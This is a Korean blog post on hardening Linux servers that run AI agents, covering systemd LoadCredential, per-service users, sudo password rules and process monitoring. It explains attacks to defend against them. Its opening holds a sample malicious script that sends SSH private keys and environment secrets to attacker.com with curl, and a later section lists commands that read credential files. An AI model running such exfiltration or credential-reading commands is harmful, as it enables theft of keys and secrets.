---
layout: post
title: "Linux 서버 보안 모델 완벽 가이드 - 시크릿 관리와 프로세스 격리"
date: 2026-01-25
categories: [infra, security]
tags: [linux, security, systemd, secrets, sudo]
description: "Linux 서버의 보안 아키텍처를 macOS와 비교하며 분석합니다. 유저 권한 모델의 한계, systemd LoadCredential을 활용한 시크릿 격리, 그리고 실용적인 보안 전략을 다룹니다."
image: /assets/images/posts/2026/linux-security-thumbnail.png
---

## 한 줄 요약

Linux는 **"같은 유저 = 같은 권한"**이 기본이다. 앱별 시크릿 격리는 OS가 기본 제공하지 않으므로, **systemd + 별도 유저 + sudo 승인** 조합으로 직접 설계해야 한다.

---

## 들어가며: AI 시대, 서버 보안이 더 중요해진 이유

AI 에이전트(Claude Code, GitHub Copilot Workspace 등)를 서버에서 활용하는 시대가 되었다. AI는 코드 작성, 파일 수정, 명령어 실행 등 **거의 모든 것**을 자율적으로 수행할 수 있다.

이것은 양날의 검이다:

```
AI 에이전트가 할 수 있는 것:
├── 코드 작성 및 수정
├── 파일 시스템 접근
├── 명령어 실행
├── 네트워크 요청
└── ... 사실상 유저가 할 수 있는 모든 것
```

**문제는 악성 스크립트도 마찬가지라는 것이다.**

### 인지되지 않은 백그라운드 스크립트의 위험

서버에서 다음과 같은 스크립트가 돌고 있다면?

```bash
# 어딘가에서 설치된 악성 스크립트
while true; do
    # SSH 키 탈취
    curl -X POST https://attacker.com/collect \
        -d "$(cat ~/.ssh/id_rsa)"

    # 환경변수의 시크릿 탈취
    curl -X POST https://attacker.com/collect \
        -d "$(env | grep -i key)"

    sleep 3600
done
```

이런 스크립트는:
- `ps aux`에 수상해 보이지 않는 이름으로 위장 가능
- cron, systemd timer, 또는 다른 서비스에 숨어서 실행
- 같은 유저 권한이면 모든 시크릿 접근 가능

**AI를 활용하면서 보안에 소홀하면, AI의 강력한 능력이 공격자에게도 열리는 셈이다.**

### 이 글에서 다루는 것

Linux 서버에서:
1. 왜 기본 설정으로는 보안이 취약한지
2. 시크릿을 안전하게 관리하는 방법
3. AI 에이전트가 작업하면서도 보안을 유지하는 방법

---

## 1. Linux vs macOS 보안 철학 비교

### macOS: 앱별 권한 세분화

```
┌─────────────────────────────────────┐
│         TCC (Transparency,          │
│      Consent, and Control)          │
├─────────────────────────────────────┤
│  Keychain: 앱별 접근 권한 설정 가능  │
│  "이 앱에 Keychain 접근 허용?"       │
├─────────────────────────────────────┤
│      Gatekeeper, Sandbox 등         │
└─────────────────────────────────────┘
```

- 앱별로 카메라, 마이크, 파일 접근 권한 분리
- Keychain 항목에 "이 앱만 접근" 설정 가능
- 실행 후에도 세밀한 통제 가능

### Linux: 유저/그룹 기반 권한

```
┌─────────────────────────────────────┐
│       root (UID 0) - 모든 권한       │
├─────────────────────────────────────┤
│     일반 유저 (UID 1000+)            │
│     - 같은 UID = 같은 권한           │
│     - 앱별 구분 없음                 │
├─────────────────────────────────────┤
│        파일 권한 (rwx)               │
└─────────────────────────────────────┘
```

- 같은 유저로 실행되는 모든 프로세스는 동등한 권한
- "이 앱만 접근" 같은 앱별 권한 제어 기본 미제공
- **실행 전 신뢰 확보**가 핵심

### 철학 차이 요약

| 항목 | macOS | Linux |
|------|-------|-------|
| 권한 단위 | 앱별 | 유저별 |
| 시크릿 접근 | 앱별 승인 팝업 | 파일 권한 |
| 보안 전략 | 실행 후 통제 | 실행 전 검증 |
| 악성 앱 대응 | 권한 거부 가능 | 실행 자체 방지 필요 |

---

## 2. Linux 보안의 핵심 한계

### 같은 유저 = 같은 권한

```bash
# hyun 유저로 실행되는 모든 프로세스는:
- ~/.ssh/* 읽기 가능
- 환경변수 접근 가능
- 같은 유저의 파일 모두 접근 가능
```

악성 스크립트가 `hyun` 유저로 실행되면:

```bash
# 이 모든 것이 가능
cat ~/.ssh/id_rsa
cat ~/.aws/credentials
env | grep API_KEY
```

### GNOME Keyring도 앱별 격리 없음

macOS Keychain과 달리:
- 세션 잠금 해제되면 모든 앱이 접근 가능
- "이 앱만 허용" 설정 없음

### EC2 기본 설정의 문제

```bash
# EC2 ubuntu 유저 기본 설정
ubuntu ALL=(ALL) NOPASSWD:ALL
```

sudo 비밀번호 없이 root 권한 획득 가능 = 악성 스크립트에게 무방비

---

## 3. 실용적인 보안 전략

### 전략 1: 시크릿 파일 권한 설정 (기본)

```bash
# 시크릿 파일 생성
sudo mkdir /etc/secrets
sudo chmod 700 /etc/secrets

# API 키 저장
sudo sh -c 'echo "your-api-key" > /etc/secrets/api_key'
sudo chmod 600 /etc/secrets/api_key
sudo chown root:root /etc/secrets/api_key
```

- root만 읽기 가능
- 일반 유저 프로세스는 접근 불가
- 단점: 앱 실행 시 sudo 필요

### 전략 2: systemd LoadCredential (권장)

```ini
# /etc/systemd/system/myapp.service
[Unit]
Description=My Application

[Service]
User=myapp
Group=myapp

# 시크릿 주입 - root 소유 파일도 서비스에 전달 가능
LoadCredential=api_key:/etc/secrets/api_key

# 서비스 내에서 $CREDENTIALS_DIRECTORY/api_key로 접근
ExecStart=/usr/bin/myapp

# 추가 보안 옵션
ProtectHome=true
ProtectSystem=strict
PrivateTmp=true
NoNewPrivileges=true

[Install]
WantedBy=multi-user.target
```

**동작 방식:**

```
1. systemd가 서비스 시작 시 /etc/secrets/api_key 읽음
2. /run/credentials/myapp.service/api_key에 복사
3. 디렉토리 권한을 myapp 유저로 설정
4. 다른 서비스/프로세스는 접근 불가
5. 서비스 종료 시 삭제
```

**앱 내에서 접근:**

```python
# Python 예시
import os

credentials_dir = os.environ.get('CREDENTIALS_DIRECTORY')
with open(f'{credentials_dir}/api_key') as f:
    api_key = f.read().strip()
```

### 전략 3: 서비스별 전용 유저

```bash
# 서비스 전용 유저 생성 (로그인 불가)
sudo useradd -r -s /bin/false myapp

# 각 서비스마다 별도 유저
sudo useradd -r -s /bin/false payment-service
sudo useradd -r -s /bin/false notification-service
```

**장점:**
- 한 서비스가 털려도 다른 서비스 시크릿은 안전
- 서비스 간 격리

### 전략 4: sudo 비밀번호 필수화

```bash
sudo visudo

# 변경 전 (EC2 기본)
ubuntu ALL=(ALL) NOPASSWD:ALL

# 변경 후
ubuntu ALL=(ALL) ALL

# 또는 특정 명령만 NOPASSWD
ubuntu ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart myapp
ubuntu ALL=(ALL) NOPASSWD: /usr/bin/journalctl
```

**효과:**
- 악성 스크립트가 sudo 사용 불가
- 사용자 비밀번호 입력 = 명시적 승인

### 전략 5: TTY 필수 설정

```bash
sudo visudo

# 추가
Defaults requiretty
```

- 백그라운드 프로세스의 sudo 사용 차단
- 터미널에서만 sudo 가능

---

## 4. 실전 시나리오: AI 에이전트 서버 보안

AI 에이전트(Claude Code, Cursor, Copilot 등)가 서버에서 자율적으로 작업하는 환경이 늘어나고 있다. 이때 보안 설계가 특히 중요하다.

### AI 에이전트의 특수성

```
기존 개발 환경:
- 개발자가 직접 명령어 입력
- 실행 전 검토 가능
- 의도하지 않은 동작 = 개발자 실수

AI 에이전트 환경:
- AI가 자율적으로 명령어 실행
- 수많은 작업을 빠르게 수행
- 의도하지 않은 동작 = AI 오류 또는 취약점 악용
```

AI가 강력할수록 보안이 뚫렸을 때 피해도 크다. **AI에게 권한을 줄 때는 더욱 신중해야 한다.**

### 요구사항

1. AI 에이전트가 자율적으로 작업 수행
2. 특정 시크릿(API 키 등) 접근 필요
3. 악성 스크립트가 시크릿 탈취 불가능해야 함
4. 사용자가 명시적으로 승인한 경우에만 민감한 작업 수행

### 해결책: sudo + 전용 유저 + LoadCredential

```bash
# 1. Claude 전용 유저 생성
sudo useradd -r -m -s /bin/bash claude-runner

# 2. 시크릿 설정 (root만 접근)
sudo mkdir -p /etc/secrets/claude
sudo chmod 700 /etc/secrets/claude
sudo sh -c 'echo "api-key-here" > /etc/secrets/claude/api_key'
sudo chmod 600 /etc/secrets/claude/api_key

# 3. Claude 실행 스크립트
sudo tee /opt/run-claude.sh << 'EOF'
#!/bin/bash
# 시크릿 로드
export API_KEY=$(cat /etc/secrets/claude/api_key)

# claude-runner 유저로 실행
sudo -u claude-runner --preserve-env=API_KEY claude "$@"
EOF

sudo chmod 755 /opt/run-claude.sh
```

**실행 흐름:**

```
사용자 → sudo /opt/run-claude.sh → 비밀번호 입력 (승인)
                ↓
         시크릿 로드 (root 권한)
                ↓
         claude-runner로 전환
                ↓
         Claude 실행 (시크릿은 환경변수로만)
```

**보안 효과:**

| 공격 시나리오 | 결과 |
|--------------|------|
| 악성 스크립트가 시크릿 파일 읽기 | 실패 (root 소유) |
| 악성 스크립트가 sudo 시도 | 실패 (비밀번호 없음) |
| 악성 스크립트가 Claude 프로세스 메모리 접근 | 실패 (다른 유저) |
| 사용자가 직접 실행 | 성공 (비밀번호 승인) |

---

## 5. AWS 환경 시크릿 관리

### EC2 IAM Role의 한계

```bash
# 인스턴스의 모든 프로세스가 접근 가능
aws secretsmanager get-secret-value --secret-id my-secret
```

IAM Role은 **인스턴스 단위** 권한이므로 프로세스별 격리 불가.

### 해결책: 서비스별 격리

| 환경 | 격리 수준 | 방법 |
|------|----------|------|
| EC2 단일 인스턴스 | 인스턴스 단위 | systemd + 별도 유저 조합 |
| ECS | 컨테이너 단위 | Task Role |
| Lambda | 함수 단위 | Execution Role |
| EKS | Pod 단위 | IRSA (IAM Roles for Service Accounts) |

**프로세스별 격리가 필요하면 ECS/EKS 권장.**

### AWS Secrets Manager + LoadCredential 조합

```bash
# 부팅 시 시크릿 다운로드 (root로 실행)
aws secretsmanager get-secret-value \
  --secret-id prod/api-key \
  --query SecretString \
  --output text > /etc/secrets/api_key

chmod 600 /etc/secrets/api_key
```

```ini
# systemd 서비스
[Service]
LoadCredential=api_key:/etc/secrets/api_key
```

---

## 6. 백그라운드 프로세스 모니터링

### 인지되지 않은 스크립트 탐지

서버에 어떤 프로세스가 돌고 있는지 정기적으로 확인해야 한다.

```bash
# 현재 실행 중인 프로세스 확인
ps aux --sort=-%mem | head -20

# 네트워크 연결 중인 프로세스
ss -tulnp

# 최근 설치된 cron job
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -u $user -l 2>/dev/null
done

# systemd timer 확인
systemctl list-timers --all

# 최근 수정된 실행 파일
find /usr/local/bin /opt -type f -mtime -7 -executable
```

### 수상한 징후

```
주의해야 할 패턴:
├── 알 수 없는 이름의 프로세스
├── 비정상적인 네트워크 연결 (특히 아웃바운드)
├── 숨겨진 디렉토리의 실행 파일 (.hidden/)
├── base64 인코딩된 명령어 실행
└── 비정상적인 시간대의 cron job
```

### 자동화된 모니터링

```bash
# 프로세스 모니터링 도구 설치
sudo apt install auditd

# 파일 무결성 검사
sudo apt install aide
sudo aideinit
```

**AI 에이전트를 사용할수록, 서버에서 무엇이 실행되고 있는지 파악하는 것이 중요하다.**

---

## 7. 보안 체크리스트

### 서버 기본 설정

- [ ] SSH 패스워드 인증 비활성화
- [ ] SSH 키 인증만 허용
- [ ] root 직접 로그인 차단
- [ ] 방화벽 필수 포트만 오픈
- [ ] 자동 보안 패치 (unattended-upgrades)
- [ ] fail2ban 설치

### 시크릿 관리

- [ ] 시크릿 파일 `chmod 600`, `chown root:root`
- [ ] systemd LoadCredential 사용
- [ ] 서비스별 전용 유저 분리
- [ ] sudo 비밀번호 필수화
- [ ] 환경변수보다 파일 마운트 선호 (Docker)

### 프로세스 격리

- [ ] 서비스별 별도 유저
- [ ] systemd 보안 옵션 활용 (ProtectHome, PrivateTmp 등)
- [ ] 민감한 서비스는 Docker/컨테이너로 격리

---

## 8. 결론

### AI 시대의 Linux 보안 원칙

1. **실행 전 신뢰 확보**: 신뢰할 수 있는 코드만 실행
2. **최소 권한 원칙**: AI 에이전트에게도 필요한 권한만 부여
3. **격리**: 서비스별 유저 분리, 컨테이너 활용
4. **승인 게이트**: sudo 비밀번호로 명시적 승인
5. **모니터링**: 백그라운드에서 무엇이 실행되는지 파악

### AI 에이전트 활용 시 핵심 포인트

```
AI가 강력할수록 보안이 중요하다.
├── AI가 할 수 있는 것 = 악성 스크립트도 할 수 있는 것
├── 시크릿 접근은 명시적 승인 필요
├── 백그라운드 프로세스 정기 점검
└── 의심스러운 것은 격리 후 실행
```

### macOS vs Linux 최종 비교

```
macOS: "실행해도 될까요?" (런타임 승인)
Linux: "이 코드 신뢰해?" (실행 전 검증)
```

Linux는 macOS처럼 "앱별 시크릿 접근 승인" UI가 없지만, **systemd LoadCredential + 서비스 전용 유저 + sudo 비밀번호** 조합으로 동등한 보안 수준을 달성할 수 있다.

**핵심은 시스템 설계:**
- 시크릿 접근 = root 권한 필요
- 서비스 등록 = root 권한 필요 (관리자 승인)
- 실행 = sudo 비밀번호 (사용자 승인)
- 모니터링 = 인지되지 않은 프로세스 탐지

이 구조가 곧 "이 앱에 시크릿 접근을 허용하시겠습니까?"와 같은 역할을 한다.

**AI를 100% 활용하면서도 보안을 유지하려면, 처음부터 보안을 고려한 시스템 설계가 필수다.**
